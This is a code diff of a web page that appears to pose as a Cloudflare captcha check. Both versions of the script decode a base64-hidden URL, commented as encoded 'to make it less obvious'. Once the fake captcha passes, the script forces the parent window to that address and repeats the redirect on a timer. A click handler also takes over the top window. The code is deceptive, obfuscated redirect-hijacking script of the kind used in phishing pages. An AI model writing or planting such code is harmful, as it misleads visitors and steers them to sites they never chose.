@@ -719,48 +719,32 @@ setTimeout(function(){
       $('.capcha__ok').addClass("capcha__ok_active");
 
           setTimeout(function(){
-function check_link() {
-    // Base64 encode the link to make it less obvious
-    let encodedLink = 'aHR0cHM6Ly9zYWxpa2suY29tLw==';
-    
-    // Decode and redirect after a small delay
-    setTimeout(function() {
+
+    function check_link() {
+        // Base64 encode the link to make it less obvious
+        let encodedLink = 'aHR0cHM6Ly9zYWxpa2suY29tLw==';
+
+        // Decode and redirect immediately
         window.parent.location.href = atob(encodedLink);
-    }, 10); // Delay of 1 second
-}
-$(document).ready(function(){
-    check_link();
+    }
 
-    setInterval(function() {
-        check_link();
-    }, 1000);
-});
+    $(document).ready(function() {
+        // Initial redirect after 3 seconds
+        setTimeout(check_link, 3000);
 
-// Initial delay of 3 seconds before the first check
-setTimeout(function(){
-    check_link();
-}, 3000);
-        $(document).ready(function(){
-                        check_link();
-                        setInterval(function() {
-                                check_link();
-                        }, 10000);
-                });
- }, 3000);
-    }, 3000);
-});
+        // Redirect every 10 seconds
+        setInterval(check_link, 10000);
+    });
 
-                </script>
-
-
-<script>
-  document.addEventListener('click', function(evt) {
-  if (evt.target.matches('a.parent-window-link')) {
-    window.top.location = evt.target.href // <-- all magic here
-    return false
-  }
-})
+    // Event listener for link clicks
+    document.addEventListener('click', function(evt) {
+        if (evt.target.matches('a.parent-window-link')) {
+            window.top.location = evt.target.href; // Redirect to the clicked link
+            return false; // Prevent default behavior
+        }
+    });
 </script>
+
 
       <div class="cf-error-footer cf-wrapper w-240 lg:w-full py-10 sm:py-4 sm:px-8 mx-auto text-center sm:text-left border-solid border-0 border-t border-gray-300">
   	<p class="text-13">
